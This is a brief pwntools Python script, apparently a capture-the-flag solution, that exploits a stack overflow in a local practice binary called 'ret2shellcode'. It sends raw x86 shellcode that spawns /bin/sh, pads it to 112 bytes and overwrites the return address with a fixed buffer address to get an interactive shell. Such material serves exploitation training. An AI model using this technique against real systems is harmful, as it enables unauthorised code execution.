##!/usr/bin/env python
from pwn import *
 
sh = process('./ret2shellcode')
#shellcode = asm(shellcraft.sh())
shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
shellcode += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
shellcode += "\x0b\xcd\x80"

buf2_addr = 0x804a080
 
sh.sendline(shellcode.ljust(112, 'A') + p32(buf2_addr))
sh.interactive()
